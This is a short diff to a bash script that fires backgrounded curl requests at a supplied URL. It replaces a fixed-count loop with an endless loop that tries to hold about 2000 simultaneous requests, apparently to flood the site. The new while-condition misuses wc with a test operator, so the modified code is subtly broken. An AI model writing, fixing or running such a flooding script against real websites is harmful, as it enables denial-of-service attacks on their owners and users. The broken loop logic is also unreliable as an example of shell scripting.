@@ -28,6 +28,12 @@ if [[ -z $URL ]] || [[ $SAYI -eq 0 ]]; then
   exit 1
 fi
 
-for i in $(seq 1 $SAYI); do
+count=0
+while (ps aux | grep curl | wc -l -eq 2001); do
   curl -L "$URL">/dev/null 2>&1 &
+  ((count++))
+  if [[ count -eq 2000 ]];
+  then
+    count=0
+  fi
 done
